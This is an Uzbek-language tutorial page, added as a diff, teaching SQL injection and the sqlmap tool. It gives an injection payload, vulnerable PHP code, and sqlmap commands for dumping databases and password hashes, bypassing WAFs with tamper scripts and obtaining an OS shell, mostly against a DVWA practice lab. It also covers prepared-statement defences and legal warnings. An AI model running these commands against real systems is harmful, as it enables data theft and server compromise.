@@ -1,0 +1,359 @@
+---
+title: "SQLmap — SQL injection audit"
+description: "SQLmap — avtomatik SQL injection skanerlash va exploit."
+order: 8
+level: "advanced"
+estimated_minutes: 9
+prerequisites:
+  - "/kali/ethical-hacking"
+  - "/fundamentals/postgresql"
+learning_objectives:
+  - "SQL injection tushuncha"
+  - "SQLmap asoslari"
+  - "GET/POST/Cookie injection"
+  - "Database dump"
+  - "Himoya — prepared statements"
+tags: ["kali", "sqlmap", "sqli", "web"]
+lastUpdated: "2026-05-26"
+author: "LinuxHubuz jamoasi"
+references:
+  - title: "SQLmap"
+    url: "https://sqlmap.org/"
+  - title: "OWASP SQL Injection"
+    url: "https://owasp.org/www-community/attacks/SQL_Injection"
+---
+
+**SQLmap** — avtomatik SQL injection (SQLi) skaner va exploit. Web app'da SQLi zaifligini topib, ma'lumotlarni chiqarish, hatto OS shell olish.[¹](https://sqlmap.org/)
+
+<Callout type="warning" title="QONUNIY OGOHLANTIRISH">
+SQLmap faqat **o'zingiz egasi bo'lgan** yoki **yozma ruxsat olingan** dasturlar uchun. Bowsma ruxsatsiz scan — jinoyat. Bug bounty platform'lar orqali qonuniy ish.
+</Callout>
+
+<Callout type="info" title="Bu darsda nimani o'rganasiz">
+- SQL injection nima.
+- SQLmap GET/POST/Cookie injection.
+- Database dump.
+- WAF bypass.
+- Himoya — prepared statements va ORM.
+</Callout>
+
+## 1. SQL Injection nima?
+
+User input SQL query'ga to'g'ridan-to'g'ri qo'shilganda zaiflik:
+
+**Zaif PHP:**
+
+```php
+$user = $_GET['user'];
+$query = "SELECT * FROM users WHERE name = '$user'";
+```
+
+Hujum:
+
+```
+http://target/users.php?user=admin' OR '1'='1
+```
+
+SQL bo'ladi:
+
+```sql
+SELECT * FROM users WHERE name = 'admin' OR '1'='1'
+-- Hammasi qaytariladi
+```
+
+## 2. Test laboratoriya
+
+Test uchun:
+
+- **DVWA** (Damn Vulnerable Web App)
+- **Mutillidae**
+- **bWAPP**
+- **WebGoat**
+- **PortSwigger Web Academy** (bepul lab)
+
+```bash
+sudo apt install -y dvwa
+# yoki Docker'da
+docker run -d -p 8080:80 vulnerables/web-dvwa
+```
+
+## 3. SQLmap asoslari
+
+```bash
+# Versiya
+sqlmap --version
+
+# GET parameter
+sqlmap -u "http://target/users.php?user=admin"
+
+# Avtomatik (savol so'ramaydi)
+sqlmap -u "http://target/users.php?user=admin" --batch
+```
+
+## 4. Database aniqlash
+
+```bash
+sqlmap -u "http://target/users.php?user=admin" --dbs --batch
+
+# Chiqish:
+# [INFO] the back-end DBMS is MySQL
+# available databases [3]:
+# [*] information_schema
+# [*] dvwa
+# [*] mysql
+```
+
+## 5. Jadval ro'yxati
+
+```bash
+sqlmap -u "http://target/users.php?user=admin" -D dvwa --tables --batch
+
+# Database: dvwa
+# +-----------+
+# | guestbook |
+# | users     |
+# +-----------+
+```
+
+## 6. Column ro'yxati
+
+```bash
+sqlmap -u "http://target/users.php?user=admin" -D dvwa -T users --columns --batch
+
+# Database: dvwa, Table: users
+# +-------------+--------------+
+# | Column      | Type         |
+# | user        | varchar(15)  |
+# | password    | varchar(32)  |
+# | first_name  | varchar(15)  |
+# +-------------+--------------+
+```
+
+## 7. Ma'lumotlarni dump
+
+```bash
+sqlmap -u "http://target/users.php?user=admin" -D dvwa -T users --dump --batch
+
+# Database: dvwa, Table: users
+# +---------+-----------------------------+
+# | user    | password (MD5)              |
+# | admin   | 5f4dcc3b5aa765d61d8327deb... |
+# | gordonb | e99a18c428cb38d5f260853...   |
+# +---------+-----------------------------+
+```
+
+Avtomatik password hash'ni JtR yoki hashcat bilan crack ham qiladi.
+
+## 8. POST injection
+
+```bash
+# POST data
+sqlmap -u "http://target/login.php" --data="username=admin&password=test" --batch
+
+# JSON POST
+sqlmap -u "http://target/api/login" --data='{"username":"admin","password":"test"}' --batch
+```
+
+## 9. Cookie injection
+
+```bash
+sqlmap -u "http://target/" --cookie="session=abc123;user=admin" --level=2 --batch
+```
+
+`--level` 2+ cookie'lar ham tekshiriladi.
+
+## 10. Burp Suite request
+
+Burp'dan request saqlab:
+
+```bash
+sqlmap -r request.txt --batch
+```
+
+`request.txt`:
+
+```
+POST /login.php HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=abc
+
+username=admin&password=test
+```
+
+## 11. Level va risk
+
+```bash
+sqlmap -u "http://target/?id=1" --level=3 --risk=2 --batch
+```
+
+- `--level` 1-5 — qancha test (parameter, header, cookie).
+- `--risk` 1-3 — payload xavfliligi.
+
+Yuqori level = ko'proq vaqt, lekin ko'proq topiladi.
+
+## 12. WAF bypass
+
+Web Application Firewall'ni chetlab o'tish:
+
+```bash
+# Tamper script'lar
+sqlmap -u "http://target/?id=1" --tamper=space2comment,charencode --batch
+
+# Ro'yxat
+sqlmap --list-tampers
+```
+
+## 13. OS shell
+
+Agar `FILE` privilege bo'lsa:
+
+```bash
+sqlmap -u "http://target/?id=1" --os-shell --batch
+# os-shell> id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Bu — to'liq pentest.
+
+## 14. Misol — DVWA SQLi
+
+```bash
+# 1. Login DVWA, security level "low"
+# 2. SQLi sahifasi: http://localhost/dvwa/vulnerabilities/sqli/?id=1
+
+# 3. Cookie kerak (session)
+curl -c cookies.txt http://localhost/dvwa/login.php
+
+# 4. SQLmap
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="PHPSESSID=$(grep PHPSESSID cookies.txt | cut -f7); security=low" \
+    --dbs --batch
+```
+
+## 15. Himoya — prepared statements
+
+**Zaif (PHP):**
+
+```php
+$query = "SELECT * FROM users WHERE name = '$_GET[user]'";
+```
+
+**Xavfsiz (PDO):**
+
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
+$stmt->execute([$_GET['user']]);
+```
+
+**Python (SQLAlchemy):**
+
+```python
+User.query.filter_by(name=request.args.get('user')).first()
+```
+
+**Node.js (parameterized):**
+
+```js
+db.query('SELECT * FROM users WHERE name = $1', [req.query.user]);
+```
+
+ORM ishlatsangiz — avtomatik xavfsiz.
+
+## 16. WAF (qo'shimcha qatlam)
+
+- **ModSecurity** — Apache/Nginx WAF.
+- **Cloudflare** — managed WAF.
+- **AWS WAF**, **Azure Front Door** — cloud.
+
+Lekin WAF'ga ishonib qolmang — kod xavfsiz bo'lishi shart.
+
+## 17. Eng tez-tez uchraydigan xatolar
+
+- **`--batch` qilmaslik** — har savol terminalni to'xtatadi.
+- **`--cookie` yo'q** — autentifikatsiya kerakli sahifa skanerlanmadi.
+- **`--level=1` past** — ko'p variant o'tkazib yuboradi.
+- **Tezlik chegarasiz** — server crash bo'lishi mumkin.
+- **Production'da** — yozma ruxsatsiz hech qachon.
+
+## 18. Eng yaxshi amaliyot
+
+- **Bug bounty** — qonuniy yo'l.
+- **Lab muhitida** — DVWA, PortSwigger.
+- **`--batch`** — CI/CD pipeline'da.
+- **Output saqlash** — `--output-dir=` bilan.
+- **Himoya — prepared statements** — har vaqt.
+
+## 19. Mashqlar
+
+1. **DVWA setup:** Docker'da DVWA ishga tushiring.
+2. **GET injection:** `?id=` parameter'ni skan.
+3. **POST:** Login form'da SQLi.
+4. **Dump:** Users jadvalini ekstraktsiya.
+5. **Himoya:** PHP/Node skript'ingizni prepared statements bilan yozing.
+
+## 20. Bilim sinovi
+
+**Savol 1.** SQL injection nima?
+
+- a) Database backup
+- b) User input SQL query'ga to'g'ridan-to'g'ri qo'shilganda
+- c) Database o'chirish
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** Parametrlangan emas user input — SQL ichida buyruq sifatida tushuniladi.[¹](https://owasp.org/www-community/attacks/SQL_Injection)
+</Callout>
+
+**Savol 2.** SQLmap default'da hammasini batch'da bajaradi:
+
+- a) Ha
+- b) Yo'q — `--batch` flag kerak
+- c) Faqat verbose
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** Default — har savol uchun y/n so'raydi. `--batch` avtomatik.
+</Callout>
+
+**Savol 3.** Eng yaxshi SQLi himoya:
+
+- a) WAF
+- b) Prepared statements / parameterized queries
+- c) String escape
+- d) Hash
+
+<Callout type="success" title="Javob">
+**(b)** Driver darajasida user input data sifatida, SQL kodi sifatida emas.
+</Callout>
+
+**Savol 4.** SQLmap `--os-shell` nima beradi?
+
+- a) Database query
+- b) OS shell (`FILE` privilege orqali)
+- c) Backup
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** To'liq tizimga kirish — agar DB user'da kerakli privilege bo'lsa.
+</Callout>
+
+**Savol 5.** Boshqa kompaniya saytini SQLmap'lash:
+
+- a) OK ta'lim uchun
+- b) Jinoyat (yozma ruxsatsiz)
+- c) OK agar bepul
+- d) Hech narsa
+
+<Callout type="success" title="Javob">
+**(b)** Bug bounty platform'lardan tashqari — qonunbuzar.
+</Callout>
+
+## Manbalar
+
+1. SQLmap. [https://sqlmap.org/](https://sqlmap.org/)
+2. OWASP SQL Injection. [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+
+## Keyingi qadam
+
+👉 [Kali — Gobuster directory enum](/kali/tools/gobuster)
